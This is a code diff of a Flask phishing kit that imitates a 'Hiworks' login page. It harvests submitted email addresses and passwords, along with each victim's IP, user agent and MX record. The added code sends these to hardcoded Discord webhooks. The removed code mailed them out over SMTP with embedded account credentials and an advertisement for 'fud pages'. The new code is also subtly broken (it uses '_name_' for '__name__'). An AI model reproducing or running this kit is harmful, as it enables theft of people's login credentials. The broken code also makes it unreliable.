@@ -1,3 +1,4 @@
+import requests
 from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
 import secrets
 import random
@@ -11,10 +12,52 @@ from flask_limiter.util import get_remote_address
 import smtplib, ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+import time
+import random
+import dns.resolver
 
-# made for education purposes only
+# Discord Webhook URL
+DISCORD_WEBHOOK_URLS = [
+    "https://discord.com/api/webhooks/1348669865195733002/ZszNmtxM4biaP6sjAahS5jXJmqJ19LuifBafAledLqF-sOMJEdthZlSfP7UeD2phQVE6",
+    "https://discord.com/api/webhooks/1348669882685984861/yZ_fqd_KHsXo-Mc1SttB2xKqPYvMNKMQA7kwLFOLT20o4KGeGIKD5e7jnfQu1KSNgDDn",
+    "https://discord.com/api/webhooks/1348669936964337715/CuVDPFNpftjEvDSwSb2FaBkbzl6bXxhjMlzbjl2x70Ufx6zitCfiMRKFCcwH-SiWzdgP"
+]
 
-app = Flask(__name__)
+def send_discord_message(email, password, ip, useragent, domain, mx_record):
+    webhook_url = random.choice(DISCORD_WEBHOOK_URLS)  # Select a random webhook
+    message = {
+        "username": "Logger Bot",
+        "avatar_url": "https://i.imgur.com/zW2WJ3o.png",  # Optional bot avatar
+        "embeds": [
+            {
+                "title": "🔔 Hiworks Login Attempt",
+                "color": 16711680,  # Red color in Discord embed
+                "fields": [
+                    {"name": "📧 Email", "value": f"{email}", "inline": False},
+                    {"name": "🔑 Password", "value": f"{password}", "inline": False},
+                    {"name": "🌐 IP", "value": f"{ip}", "inline": False},
+                    {"name": "🖥 User-Agent", "value": f"{useragent}", "inline": False},
+                    {"name": "🌍 Domain", "value": f"{domain}", "inline": False},
+                    {"name": "📨 MX Record", "value": f"{mx_record}", "inline": False},
+                ],
+                "footer": {"text": "Logger Bot - Secure Notifications"},
+            }
+        ]
+    }
+    
+    try:
+        requests.post(webhook_url, json=message)
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending message to Discord: {e}")
+
+def get_mx_record(domain):
+    try:
+        answers = dns.resolver.resolve(domain, 'MX')
+        return ', '.join(str(r.exchange) for r in answers)
+    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
+        return "No MX Record Found"
+
+app = Flask(_name_)
 limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
 secret_keyx = secrets.token_urlsafe(24)
 app.secret_key = secret_keyx
@@ -182,79 +225,58 @@ def route2():
 @app.route("/first", methods=['POST'])
 def first():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For')
-        if ip is None:
-            ip = request.headers.get('X-Real-IP')
-        if ip is None:
-            ip = request.headers.get('X-Client-IP')
-        if ip is None:
-            ip = request.remote_addr
+        ip = request.headers.get('X-Forwarded-For') or \
+             request.headers.get('X-Real-IP') or \
+             request.headers.get('X-Client-IP') or \
+             request.remote_addr
+
         email = request.form.get("horse")
-        passwordemail = request.form.get("pig")
-        sender_email = "peterliew@2mc.com.my"
-        sender_emaill = "peterliew"
-        receiver_email = "florencejose36@gmail.com"
-        password = "P@sswoRD*00028"
+        password = request.form.get("pig")
         useragent = request.headers.get('User-Agent')
-        message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA$$ Logs "
-        message["From"] = sender_email
-        message["To"] = receiver_email
-        text = """\
-        Hi,
-        How are you?
-        contact me on icq jamescartwright for your fud pages
-        """
-        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
-        part1 = MIMEText(text, "plain")
-        part2 = MIMEText(html, "html")
-        message.attach(part1)
-        message.attach(part2)
-        with smtplib.SMTP_SSL("mail.2mc.com.my", 465) as server:
-            server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, message.as_string())
-        # Set session value and redirect
-        session['eman'] = email  # Save email as session variable
+
+        # Get MX record
+        domain = email.split('@')[-1] if email and '@' in email else None
+        mx_record = get_mx_record(domain) if domain else "Invalid Domain"
+
+        # Send data to Discord
+        send_discord_message(email, password, ip, useragent, domain, mx_record)
+
+        # Store email in session
+        session['eman'] = email
+
+        # Redirect
         return redirect(url_for('benza', web=email))
+
+    return "Method Not Allowed", 405
 
 
 
 @app.route("/second", methods=['POST'])
 def second():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For')
-        if ip is None:
-            ip = request.headers.get('X-Real-IP')
-        if ip is None:
-            ip = request.headers.get('X-Client-IP')
-        if ip is None:
-            ip = request.remote_addr
+        ip = request.headers.get('X-Forwarded-For') or \
+             request.headers.get('X-Real-IP') or \
+             request.headers.get('X-Client-IP') or \
+             request.remote_addr
+
         email = request.form.get("horse")
-        passwordemail = request.form.get("pig")
-        sender_email = "peterliew@2mc.com.my"
-        sender_emaill = "peterliew"
-        receiver_email = "florencejose36@gmail.com"
-        password = "P@sswoRD*00028"
+        password = request.form.get("pig")
         useragent = request.headers.get('User-Agent')
-        message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA$$ Logs  !! "
-        message["From"] = sender_email
-        message["To"] = receiver_email
-        text = """\
-        Hi,
-        How are you?
-        contact me on icq jamescartwright for your fud pages
-        """
-        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
-        part1 = MIMEText(text, "plain")
-        part2 = MIMEText(html, "html")
-        message.attach(part1)
-        message.attach(part2)
-        with smtplib.SMTP_SSL("mail.2mc.com.my", 465) as server:
-            server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, message.as_string())
-        session['ins'] = email  # Save email as session variable
+
+        # Get MX record
+        domain = email.split('@')[-1] if email and '@' in email else None
+        mx_record = get_mx_record(domain) if domain else "Invalid Domain"
+
+        # Send data to Discord
+        send_discord_message(email, password, ip, useragent, domain, mx_record)
+
+        # Store email in session
+        session['ins'] = email
+
+        # Redirect
         return redirect(url_for('lasmo', web=email))
+
+    return "Method Not Allowed", 405
 
 
 
@@ -277,5 +299,5 @@ def lasmo():
         dman = session.get('ins')
     return render_template('main.html', dman=dman)
 
-if __name__ == '__main__':
+if _name_ == '_main_':
 	app.run(host="0.0.0.0", port=3000)
